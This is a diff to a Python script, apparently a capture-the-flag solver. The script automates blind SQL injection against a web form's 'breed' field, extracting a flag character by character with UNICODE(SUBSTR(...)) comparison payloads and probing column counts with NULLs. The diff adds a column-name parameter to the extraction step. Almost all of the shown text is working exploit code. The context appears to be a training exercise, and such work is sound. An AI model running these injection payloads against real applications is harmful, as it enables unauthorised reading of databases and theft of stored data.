@@ -164,7 +164,7 @@ def getColumnsName(table_name, end_offset, est_column_count):
 def getColumns(null_count, db_name):
     print('[*] Start...')
 
-    for i in range(0, int(null_count)):
+    for i in range(0, null_count):
         null = "NULL"
         if (i == 0):
             data = {
@@ -184,7 +184,7 @@ def getColumns(null_count, db_name):
             print(f"Number of columns in {db_name}: {i}")
             print('[!] Completed!')
 
-def getFlag(table_name, end_offset):
+def getFlag(table_name, column_name, end_offset):
     print('[*] Start...')
 
     flag_dirty = []
@@ -193,7 +193,7 @@ def getFlag(table_name, end_offset):
     for offset in range(1, int(end_offset)):
         for dec_number in range(32, 127):
             data = {
-                    'breed': "' OR UNICODE(SUBSTR((SELECT " + table_name[:-1] + " FROM " + table_name + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
+                    'breed': "' OR UNICODE(SUBSTR((SELECT " + column_name + " FROM " + table_name + "), " + str(offset) + ", 1)) < " + str(dec_number) + " --"
             }
 
             response = requests.post(url + post_form, headers=headers, data=data)
@@ -225,11 +225,12 @@ def choice(option):
     elif option == '4':
         null_count = input('Number of NULLs expected: ')
         db_name =  input('Database name: ')
-        getColumns(null_count=null_count, db_name=db_name)
+        getColumns(null_count=int(null_count), db_name=db_name)
     elif option == '5':
         table_name = input('Table name: ')
+        column_name = input('Column name: ')
         end_offset = input('Ending offset of the flag: ')
-        getFlag(table_name=table_name, end_offset=end_offset)
+        getFlag(table_name=table_name, column_name=column_name, end_offset=end_offset)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
@@ -254,7 +255,7 @@ if __name__ == '__main__':
             2 - Get table name (requires end_offset, est_table_count)
             3 - Get column name (requires table_name, end_offset, est_column_count)
             4 - Get number of columns (requires null_count, db_name)
-            5 - Get flag (requires table_name, end_offset)
+            5 - Get flag (requires table_name, column_name, end_offset)
         '''),
         required=True
         )
